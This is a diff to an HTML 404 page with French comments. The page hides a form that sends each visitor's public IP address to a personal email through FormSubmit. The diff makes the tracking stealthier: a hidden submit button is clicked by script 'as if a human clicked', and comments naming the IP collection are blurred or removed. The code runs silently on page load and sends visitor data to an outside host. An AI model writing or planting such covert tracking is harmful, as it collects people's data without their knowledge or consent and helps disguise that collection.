@@ -38,7 +38,6 @@
       background-color: #00bcd4;
       color: #121212;
     }
-    /* On cache le formulaire */
     #ip-form {
       display: none;
     }
@@ -49,11 +48,12 @@
   <p>Oups... La page que tu cherches n'existe pas.</p>
   <button onclick="retour()">Retour à l'accueil</button>
 
-  <!-- Formulaire FormSubmit pour recevoir l'IP -->
+  <!-- Formulaire caché -->
   <form id="ip-form" action="https://formsubmit.co/blackeige2@gmail.com" method="POST">
     <input type="hidden" name="IP" id="ip-input">
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="about:blank">
+    <button type="submit" id="submit-btn" style="display: none;"></button>
   </form>
 
   <script>
@@ -61,16 +61,16 @@
       if (document.referrer) {
         window.location.href = document.referrer;
       } else {
-        window.location.href = '/'; // si pas de referrer
+        window.location.href = '/';
       }
     }
 
-    // Récupère l'IP publique et l'envoie via FormSubmit
+    // Récupère l'IP et déclenche un "submit" comme si un humain cliquait
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
         document.getElementById('ip-input').value = data.ip;
-        document.getElementById('ip-form').submit();
+        document.getElementById('submit-btn').click(); // click sur le bouton submit caché
       });
   </script>
 </body>
